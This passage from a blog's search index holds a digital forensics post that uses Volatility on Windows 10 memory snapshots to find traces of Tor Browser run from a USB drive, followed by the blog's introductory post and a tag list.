(TBB) on an external USB drive to access webmail, and a Tor hidden service.\nIf we were reliant on disk forensics we’d still get a great set of artefacts to work with, including:\n Prefetch: what executable was run and when; Registry values: shellbags, USB connection data, shimcache entries, most recently run/viewed files; Pagefile data; or Network artefacts: if the user was operating on a corporate network we may have access to proxy logs, firewall traffic or other systems.  So, with this wide range of artefacts, what is the benefit of capturing memory? Using Volatility and a memory image from a virtual machine, we can find out what data is available to augment an investigation.\nTesting scenario The testing scenario proposed is quite basic. I’ve set up a virtual machine running Windows 10 x64 (Creators Update). My hypothetical user does the following actions:\n Accesses the internet via Edge; Searches for \u0026lsquo;Tor Browser\u0026rsquo;; Downloads the TBB installer direct to an NTFS-formatted USB; Runs the TBB setup, accepting all the defaults; Accesses the internet through the Tor network; Checks a GMX email account, and reads a message sent from a Gmail account; Copy and pastes a link sent in the email for an ‘ephemeral message’ website which provides a further link to a Tor hidden service (The New York Times https://www.nytimes3xbfgragh.onion/); Accesses https://www.nytimes3xbfgragh.onion/ and browses the front page and moves to a second page; Returns back to the GMX email tab, copy and paste the Gmail email into new email; Writes an email back to the Gmail account; and The TBB is closed and the USB pulled.  Is this a contrived example? Probably. If you test it yourself you\u0026rsquo;re likely to get a different range of artefacts, as different data will potentially be loaded into the memory at the time of the VM snapshot.\nI actually took three snapshots, as it’s so easy with virtual machines, it’s better to take more than less:\n-rwxrwxrwx 1 root root 4.0G Mar 18 22:27 Win10_14393_Tor_4_Tabs.vmem -rwxrwxrwx 1 root root 2.5M Mar 18 22:27 Win10_14393_Tor_4_Tabs.vmsn -rwxrwxrwx 1 root root 4.0G Mar 18 22:20 Win10_14393_Tor_Baseline.vmem -rwxrwxrwx 1 root root 2.0M Mar 18 22:20 Win10_14393_Tor_Baseline.vmsn -rwxrwxrwx 1 root root 4.0G Mar 18 22:30 Win10_14393_Tor_Closed.vmem -rwxrwxrwx 1 root root 2.5M Mar 18 22:30 Win10_14393_Tor_Closed.vmsn The first snapshot was Win10_14393_Tor_Baseline.vmem (and accompanying .vmsn snapshot file). This was taken after Tor was installed and run, but no other ‘user’ data (like email) was accessed (end of step 5, above).\nThe second snapshot was Win10_14393_Tor_4_Tabs.vmem. This was taken with four tabs open: GMX webmail, the website ‘Self-Destructing Message’, and two pages from the New York Times hidden service (end of step 8, above).\nThe last snapshot, Win10_14393_Tor_Closed.vmem is the one that I will predominantly focus on for the memory forensics analysis. It was taken after TBB was closed and a short amount of idle time (after step 11, above).\nI also have a baseline image of the Windows 10 RAM with no interaction and a baseline image of a generic instance of Firefox running with no TBB.\nLet\u0026rsquo;s Go!\nimageinfo / kdbgscan Volatility is the de facto tool for memory analysis and a good place to start is imageinfo:\nVolatility Foundation Volatility Framework 2.6 INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : Win10x64_10586, Win10x64_14393, Win10x64_16299, Win2016x64_14393, Win10x64_15063 (Instantiated with Win10x64_15063) AS Layer1 : SkipDuplicatesAMD64PagedMemory (Kernel AS) AS Layer2 : VMWareMetaAddressSpace (Unnamed AS) AS Layer3 : FileAddressSpace (/mnt/c/BoH/Win10_14393_Tor_Closed.vmem) PAE type : No PAE DTB : 0x1aa000L KDBG : 0xf802d38f4500L Number of Processors : 2 Image Type (Service Pack) : 0 KPCR for CPU 0 : 0xfffff802d3946000L KPCR for CPU 1 : 0xffffc00129beb000L KUSER_SHARED_DATA : 0xfffff78000000000L Image date and time : 2018-03-18 11:29:43 UTC+0000 Image local date and time : 2018-03-18 22:29:43 +1100  There are no real surprises as I already know the installation is Windows 10x64 version 14393 (Creators Update). kdbgscan could also be used to review the possible profiles and provide more detailed information:\nVolatility Foundation Volatility Framework 2.6 ************************************************** Instantiating KDBG using: Unnamed AS Win10x64_14393 (6.4.14393 64bit) Offset (V) : 0xf802d38f4500 Offset (P) : 0x13bef4500 KdCopyDataBlock (V) : 0xf802d37d4fb8 Block encoded : Yes Wait never : 0x56c003002cc6d966 Wait always : 0xb31b3986b00580 KDBG owner tag check : True Profile suggestion (KDBGHeader): Win10x64_14393 Version64 : 0xf802d38f6cf8 (Major: 15, Minor: 14393) Service Pack (CmNtCSDVersion) : 0 Build string (NtBuildLab) : 14393.447.amd64fre.rs1_release_i PsActiveProcessHead : 0xfffff802d39033d0 (59 processes) PsLoadedModuleList : 0xfffff802d3909060 (176 modules) KernelBase : 0xfffff802d3604000 (Matches MZ: True) Major (OptionalHeader) : 10 Minor (OptionalHeader) : 0 KPCR : 0xfffff802d3946000 (CPU 0) KPCR : 0xffffc00129beb000 (CPU 1) *************************************************** **snipped**  Checking baseline data The additional memory images provide a good framework to look at ‘normal’ TBB use. A pstree against the snapshot with Tor running indicates that processes of interest will be firefox.exe and tor.exe:\ndfir@LAPTOP:/mnt/c/BoH$ vol.py -f Win10_14393_Tor_4_Tabs.vmem --profile=Win10x64_14393 pstree | egrep \"firefox.exe|tor.exe\" Volatility Foundation Volatility Framework 2.6 ...... 0xffff80814dd70080:firefox.exe 7960 3320 50 0 2018-03-18 11:16:46 UTC+0000 ....... 0xffff80814e396080:firefox.exe 7924 7960 22 0 2018-03-18 11:19:29 UTC+0000 ....... 0xffff80814f5b4800:tor.exe 3552 7960 4 0 2018-03-18 11:16:51 UTC+0000 ....... 0xffff80814e56c080:firefox.exe 3876 7960 0 ------ 2018-03-18 11:16:53 UTC+0000  psscan Unlike pslist or pstree, the plugin psscan can detect previously terminated processes. In this case firefox.exe was detected as exited at the time that I shut it down.\ndfir@LAPTOP:/mnt/c/BoH$ vol.py -f Win10_14393_Tor_Closed.vmem --profile=Win10x64_14393 pstree | egrep \"firefox.exe|tor.exe\" Volatility Foundation Volatility Framework 2.6 ...... 0xffff80814dd70080:firefox.exe 7960 3320 0 ------ 2018-03-18 11:16:46 UTC+0000  This is of some assistance, mostly if the computer that you are examining doesn’t have Firefox installed then it is an indicator that it was potentially run from an external device (or perhaps there is another executable on the system called firefox.exe!)\nThe other relevant executable in this scenario, tor.exe, was not present in the list of processes.\nnetscan netscan will display network connections. Again, looking at ‘normal’ TBB behaviour identified a large number of connections via firefox.exe and tor.exe. For our test case snapshot, Volatility picked up both closed firefox.exe and tor.exe connections; a total of 134.\ndfir@LAPTOP:/mnt/c/BoH$ vol.py -f Win10_14393_Tor_Closed.vmem --profile=Win10x64_14393 netscan | egrep \"firefox.exe|tor.exe\" Volatility Foundation Volatility Framework 2.6 0x80814c899ab0 TCPv4 127.0.0.1:9150 127.0.0.1:51014 CLOSED 3552 tor.exe 2018-03-18 11:26:53 UTC+0000 0x80814c8cb8b0 TCPv4 192.168.241.133:50630 54.37.17.235:9001 CLOSED 3552 tor.exe 2018-03-18 11:18:59 UTC+0000 0x80814cafb470 TCPv4 127.0.0.1:51099 127.0.0.1:9150 CLOSED 7960 firefox.exe 2018-03-18 11:29:18 UTC+0000 0x80814d8e4170 TCPv4 127.0.0.1:50411 127.0.0.1:9151 CLOSED 7960 firefox.exe 2018-03-18 11:16:51 UTC+0000 0x80814dfffa00 TCPv4 127.0.0.1:9150 127.0.0.1:50983 CLOSED 3552 tor.exe 2018-03-18 11:26:48 UTC+0000 0x80814e09f010 TCPv4 127.0.0.1:50862 127.0.0.1:9150 CLOSED 7960 firefox.exe 2018-03-18 11:24:35 UTC+0000 0x80814e643010 TCPv4 127.0.0.1:9151 127.0.0.1:50663 CLOSED 3552 tor.exe 2018-03-18 11:19:29 UTC+0000 0x80814e774180 TCPv4 127.0.0.1:51106 127.0.0.1:9150 CLOSED 7960 firefox.exe 2018-03-18 11:29:26 UTC+0000 0x80814e923d00 TCPv4 127.0.0.1:50667 127.0.0.1:50666 CLOSED 7924 firefox.exe 2018-03-18 11:19:29 UTC+0000 0x80814e943100 TCPv4 127.0.0.1:9150 127.0.0.1:51067 CLOSED 3552 tor.exe 2018-03-18 11:28:13 UTC+0000 0x80814ec65010 TCPv4 127.0.0.1:51049 127.0.0.1:9150 CLOSED 7960 firefox.exe 2018-03-18 11:27:57 UTC+0000 **snipped**  tor.exe indicates a closed destination IP of 54.37.17.235 on port 9001. According to Tor documentation1, port 9001 is require for Tor to connect to the network.  The website Exonerator is operated by the Tor Project and can be used to check if an IP address was running as a Tor node at a certain time. \nIn our case, we can confirm that it was a Tor node and thus the computer in question did connect at least one hop to the Tor network. The listening loopback port 9150 for both firefox.exe and tor.exe is an additional indicator for Tor traffic. Tor documentation indicates Tor will listen on port 9150 for a SOCKS connection if a user wanted to route other application data through the Tor network. Therefore, this can be used as a possible indicator that the Tor network was used rather than simply a portable installation of Firefox.\n To confirm this assumption, I ran a standard installation of Firefox on a clean VM under a new snapshot path (i.e the base Windows installation without TBB ever downloaded or installed). The netscan only had traffic on port 80 and 443 as you would expect for HTTP(S) traffic. No netscan data was identified for port 9150.\ndfir@LAPTOP:/mnt/c/BoH$ vol.py -f Win10_14393_No_Tor_Firefox_Closed.vmem --profile=Win10x64_14393 netscan | grep :9150 Volatility Foundation Volatility Framework 2.6 dfir@LAPTOP:/mnt/c/BoH$  firefoxhistory Credit to superponible for writing plugins for firefox history, downloads and cookies (as well as a bunch of others). Not surprisingly, given TBB is configured not to save browsing history, the result of the plugins firefoxhistory and firefoxcookies are thin.\ndfir@LAPTOP:/mnt/c/BoH$ vol.py --plugins=/usr/lib/python2.7/dist-packages/volatility/plugins -f Win10_14393_Tor_Closed.vmem firefoxhistory | awk '{print $1, $2}' Volatility Foundation Volatility Framework 2.6 ID URL ------ -------------------------------------------------------------------------------- 4 place:type=6\u0026sort=14\u0026maxResults=1 3 place:sort=8\u0026maxResults=1 2 https://blog.torproject.org 1 https://www.torproject.org  However, again, the presence of the standard Tor history is a further indicator reinforcing the hypothesis a user was accessing the Tor network. Its counterpart plugin, firefoxcookies, did not yield any additional useable data.\nusbstor One key plugin to use in this scenario is usbstor by James Hall and Kevin Breen which scans memory for registry artefacts relating to USB devices.\nI did attempt to use usbstor with no success. This demonstrates there is an element of luck with memory forensics as no registry info specific to USB artefacts appeared to be in the memory snapshot. Even dumping the registry files and parsing with Registry Explorer, Regripper and manual review didn\u0026rsquo;t identify artefacts relating to my Lexar USB drive.\nSo with this missing artefact, how can we link (and hopefully locate) the USB drive?\nmftparser I cheated slightly on this experiment by deliberately formatting the USB with NTFS, knowing that I could run the mftparser plugin and see the results. While FAT32 still dominates USB drives, as USB and portable drives are getting larger, it is more and more common to see NTFS as the file system.\nmftparser can extract $MFT records from memory. Its output looks as follows:\nScanning for MFT entries and building directory, this can take a while *************************************************************************** MFT entry found at offset 0xa400 Attribute: In Use \u0026 File Record Number: 0 Link count: 1 $STANDARD_INFORMATION Creation Modified MFT Altered Access Date Type ------------------------------ ------------------------------ ------------------------------ ------------------------------ ---- 2018-03-08 03:37:02 UTC+0000 2018-03-08 03:37:02 UTC+0000 2018-03-08 03:37:02 UTC+0000 2018-03-08 03:37:02 UTC+0000 Hidden \u0026 System $FILE_NAME Creation Modified MFT Altered Access Date Name/Path ------------------------------ ------------------------------ ------------------------------ ------------------------------ --------- 2018-03-08 03:37:02 UTC+0000 2018-03-08 03:37:02 UTC+0000 2018-03-08 03:37:02 UTC+0000 2018-03-08 03:37:02 UTC+0000 $MFT $DATA $OBJECT_ID Object ID: 40000000-0000-0000-0000-540600000000 Birth Volume ID: 00005406-0000-0000-0000-540600000000 Birth Object ID: 32406500-000c-0000-b000-000058000000 Birth Domain ID: 01004000-0000-0500-0000-000000000000 *************************************************************************** *************************************************************************** **snipped**  In a total of 317 $MFT file entries were identified linked to the path containing \u0026lsquo;Tor Browser\u0026rsquo;.\ndfir@LAPTOP:/mnt/c/BoH$ cat mftparser.txt | egrep \"Tor Browser\" | cut -f14-20 -d ' ' 2018-03-18 11:19:30 UTC+0000 Tor Browser\\Browser\\TorBrowser\\Data\\Browser\\profile.default\\mimeTypes-1.rdf 2018-03-18 11:19:32 UTC+0000 Tor Browser\\Browser\\TorBrowser\\Data\\Browser\\Caches\\profile.default\\safebrowsing\\test-flashallow-simple.pset 2018-03-18 11:19:28 UTC+0000 Tor Browser\\Browser\\TorBrowser\\Data\\Browser\\profile.default\\sessionCheckpoints.json.tmp 2018-03-18 11:19:29 UTC+0000 Tor Browser\\Browser\\TorBrowser\\Data\\Browser\\profile.default\\prefs-1.js 2018-03-18 11:19:27 UTC+0000 Tor Browser\\Browser\\TorBrowser\\Data\\Browser\\profile.default\\content-prefs.sqlite-journal 2018-03-18 11:19:32 UTC+0000 Tor Browser\\Browser\\TorBrowser\\Data\\Browser\\Caches\\profile.default\\safebrowsing\\test-malware-simple.pset 2018-03-08 03:37:08 UTC+0000 Tor Browser\\Browser\\TorBrowser\\Data\\Browser\\profile.default\\extensions\\ko-kr.xml **snipped**  One file that is interesting for the TBB is the torrc file, which normally resides at \u0026lsquo;\\Tor Browser\\Browser\\TorBrowser\\Data\\Tor\\torrc\u0026rsquo; and contains configuration information, including location that TBB was executed. What is interesting is that this file is also not normally a large file, which means that it would be stored as a resident file within the $MFT record itself. Reviewing the mftparser output we can first locate any instances of the torrc file:\ndfir@LAPTOP:/mnt/c/BoH$ cat mftparser.txt | grep -F \"Data\\Tor\\torrc\" 2018-03-18 11:17:05 UTC+0000 2018-03-18 11:17:05 UTC+0000 2018-03-18 11:17:05 UTC+0000 2018-03-18 11:17:05 UTC+0000 Tor Browser\\Browser\\TorBrowser\\Data\\Tor\\torrc.tmp 2018-03-18 11:15:48 UTC+0000 2018-03-18 11:15:48 UTC+0000 2018-03-18 11:15:48 UTC+0000 2018-03-18 11:15:48 UTC+0000 Tor Browser\\Browser\\TorBrowser\\Data\\Tor\\torrc-defaults 2018-03-18 11:17:05 UTC+0000 2018-03-18 11:17:05 UTC+0000 2018-03-18 11:17:05 UTC+0000 2018-03-18 11:17:05 UTC+0000 Tor Browser\\Browser\\TorBrowser\\Data\\Tor\\torrc 2000-01-01 00:00:00 UTC+0000 2000-01-01 00:00:00 UTC+0000 2018-03-18 11:15:48 UTC+0000 2018-03-18 11:15:48 UTC+0000 Tor Browser\\Browser\\TorBrowser\\Data\\Tor\\torrc.orig.1  And then by refining the grep search to include some lines before and after the match we can locate the resident data from the $MFT entry:\nMFT entry found at offset 0x7df32800 Attribute: In Use \u0026 File Record Number: 222 Link count: 1 $STANDARD_INFORMATION Creation Modified MFT Altered Access Date Type ------------------------------ ------------------------------ ------------------------------ ------------------------------ ---- 2018-03-18 11:17:05 UTC+0000 2018-03-18 11:17:05 UTC+0000 2018-03-18 11:17:05 UTC+0000 2018-03-18 11:17:05 UTC+0000 Archive $FILE_NAME Creation Modified MFT Altered Access Date Name/Path ------------------------------ ------------------------------ ------------------------------ ------------------------------ --------- 2018-03-18 11:17:05 UTC+0000 2018-03-18 11:17:05 UTC+0000 2018-03-18 11:17:05 UTC+0000 2018-03-18 11:17:05 UTC+0000 Tor Browser\\Browser\\TorBrowser\\Data\\Tor\\torrc $DATA 0000000000: 23 20 54 68 69 73 20 66 69 6c 65 20 77 61 73 20 #.This.file.was. 0000000010: 67 65 6e 65 72 61 74 65 64 20 62 79 20 54 6f 72 generated.by.Tor 0000000020: 3b 20 69 66 20 79 6f 75 20 65 64 69 74 20 69 74 ;.if.you.edit.it 0000000030: 2c 20 63 6f 6d 6d 65 6e 74 73 20 77 69 6c 6c 20 ,.comments.will. 0000000040: 6e 6f 74 20 62 65 20 70 72 65 73 65 72 76 65 64 not.be.preserved 0000000050: 0d 0a 23 20 54 68 65 20 6f 6c 64 20 74 6f 72 72 ..#.The.old.torr 0000000060: 63 20 66 69 6c 65 20 77 61 73 20 72 65 6e 61 6d c.file.was.renam 0000000070: 65 64 20 74 6f 20 74 6f 72 72 63 2e 6f 72 69 67 ed.to.torrc.orig 0000000080: 2e 31 20 6f 72 20 73 69 6d 69 6c 61 72 2c 20 61 .1.or.similar,.a 0000000090: 6e 64 20 54 6f 72 20 77 69 6c 6c 20 69 67 6e 6f nd.Tor.will.igno 00000000a0: 72 65 20 69 74 0d 0a 0d 0a 44 61 74 61 44 69 72 re.it....DataDir 00000000b0: 65 63 74 6f 72 79 20 45 3a 5c 54 6f 72 20 42 72 ectory.E:\\Tor.Br 00000000c0: 6f 77 73 65 72 5c 42 72 6f 77 73 65 72 5c 54 6f owser\\Browser\\To 00000000d0: 72 42 72 6f 77 73 65 72 5c 44 61 74 61 5c 54 6f rBrowser\\Data\\To 00000000e0: 72 0d 0a 47 65 6f 49 50 46 69 6c 65 20 45 3a 5c r..GeoIPFile.E:\\ 00000000f0: 54 6f 72 20 42 72 6f 77 73 65 72 5c 42 72 6f 77 Tor.Browser\\Brow 0000000100: 73 65 72 5c 54 6f 72 42 72 6f 77 73 65 72 5c 44 ser\\TorBrowser\\D 0000000110: 61 74 61 5c 54 6f 72 5c 67 65 6f 69 70 0d 0a 47 ata\\Tor\\geoip..G 0000000120: 65 6f 49 50 76 36 46 69 6c 65 20 45 3a 5c 54 6f eoIPv6File.E:\\To 0000000130: 72 20 42 72 6f 77 73 65 72 5c 42 72 6f 77 73 65 r.Browser\\Browse 0000000140: 72 5c 54 6f 72 42 72 6f 77 73 65 72 5c 44 61 74 r\\TorBrowser\\Dat 0000000150: 61 5c 54 6f 72 5c 67 65 6f 69 70 36 0d 0a a\\Tor\\geoip6.. *************************************************************************** ***************************************************************************  Using a hex editor, the $MFT entry can be carved from the image from offset 0x7df32800. The data recovered confirms the path, including the volume letter, TBB was executed, and if any other options were manually configured. The timestamps on this file can be used to accurately pivot back and forward in an attempt reconstruct user activity through any timeline analysis.\n Other plugins Some plugins didn’t identify any useful data: shellbags, shimcache, userassist, or clipboard. It is definitely not consistent, as earlier testing that I have done with TBB memory images did identify at least some shellbag data. This data however is registry based and can be pulled separately from the disk.\nNext Steps An additional Volatility plugin that might be useful includes timeliner; however, based on network connections, and exited processes we can say with good confidence that TBB was run on the system prior to the memory image being taken.\nUsing the date and time from the torrc file we can determine when Tor was executed and from what volume. This could be matched with prefetch files from the hard drive and then registry entries for the USB. These entries could then give us the make and model of the USB. For law enforcement, this could provide additional information on hidden services accessed. For corporate environments, this can assist in identifying suspicious or unwanted user behaviour.\nIn a forthcoming part 2 of this post, I\u0026rsquo;ll look at Bulk Extractor to pull out additional data from this memory image.\nPlease feel free to provide any questions, comments, or corrections at matt@bitofhex.com or via Twitter @mattnotmax.\n##Related Links: The Volatility Foundation Volatility Github The Art of Memory Forensics Tor Project\n  See: https://www.torproject.org/docs/faq.html.en \u0026#x21a9;\u0026#xfe0e;\n   ","id":16,"section":"posts","summary":"Memory forensics is a powerful tool. All executed code and data passes through RAM which makes it perfect for hunting malware. Most discussion on memory forensics is focused (rightly) on malware analysis, and the benefits of memory forensics for non-malware scenarios have been less publicised.\nOften, a lack of understanding of the benefits of memory forensics has pervaded internal investigations or law enforcement. There is a tendency to think, “we’ve got the whole box, so why would we need the memory?","tags":["memory forensics","tor"],"title":"Memory Forensics \u0026 Tor","uri":"https://bitofhex.com/2018/04/29/volatility-and-tor/","year":"2018"},{"content":"Hello!\nThis is the beginning of my digital forensics \u0026amp; incident response blog, bit_of_hex. This blog is born of the philosophy that everyone in the DFIR space has something to contribute, at any level or area within the community.\nI also realised that I have benefited for so long from other people\u0026rsquo;s research and effort that it was time I gave something back. Many times when I have searched for that particular forensic artefact or obscure problem I\u0026rsquo;ve found someone who has taken the time to publish their own research. I\u0026rsquo;m hoping that perhaps some of my work can assit others in the same way.\nMy professional background was originally the \u0026lsquo;DF\u0026rsquo; in DFIR; however, I\u0026rsquo;d like to use this space to explore different areas across the wide range of topics covered in our field.\nIf you have any suggestions, corrections, or comments I am available at matt@bitofhex.com or via Twitter at @mattnotmax\nThanks for reading! Matt\n","id":17,"section":"posts","summary":"Hello!\nThis is the beginning of my digital forensics \u0026amp; incident response blog, bit_of_hex. This blog is born of the philosophy that everyone in the DFIR space has something to contribute, at any level or area within the community.\nI also realised that I have benefited for so long from other people\u0026rsquo;s research and effort that it was time I gave something back. Many times when I have searched for that particular forensic artefact or obscure problem I\u0026rsquo;ve found someone who has taken the time to publish their own research.","tags":null,"title":"Introducing bit_of_hex","uri":"https://bitofhex.com/2018/04/28/introducing-bit_of_hex/","year":"2018"}],"tags":[{"title":"apt","uri":"https://bitofhex.com/tags/apt/"},{"title":"ATT\u0026CK","uri":"https://bitofhex.com/tags/attck/"},{"title":"books","uri":"https://bitofhex.com/tags/books/"},{"title":"chrome","uri":"https://bitofhex.com/tags/chrome/"},{"title":"competition","uri":"https://bitofhex.com/tags/competition/"},{"title":"cyberchef","uri":"https://bitofhex.com/tags/cyberchef/"},{"title":"dates and times","uri":"https://bitofhex.com/tags/dates-and-times/"},{"title":"encoding","uri":"https://bitofhex.com/tags/encoding/"},{"title":"http/2","uri":"https://bitofhex.com/tags/http/2/"},{"title":"incident response","uri":"https://bitofhex.com/tags/incident-response/"},{"title":"learning","uri":"https://bitofhex.com/tags/learning/"},{"title":"lnk files","uri":"https://bitofhex.com/tags/lnk-files/"},{"title":"malware","uri":"https://bitofhex.com/tags/malware/"},{"title":"memory forensics","uri":"https://bitofhex.com/tags/memory-forensics/"},{"title":"python","uri":"https://bitofhex.com/tags/python/"},{"title":"theory","uri":"https://bitofhex.com/tags/theory/"},{"title":"threat intelligence","uri":"https://bitofhex.com/tags/threat-intelligence/"},{"title":"tools","uri":"https://bitofhex.com/tags/tools/"},{"title":"tor","uri":"https://bitofhex.com/tags/tor/"},{"title":"verification","uri":"https://bitofhex.com/tags/verification/"}]}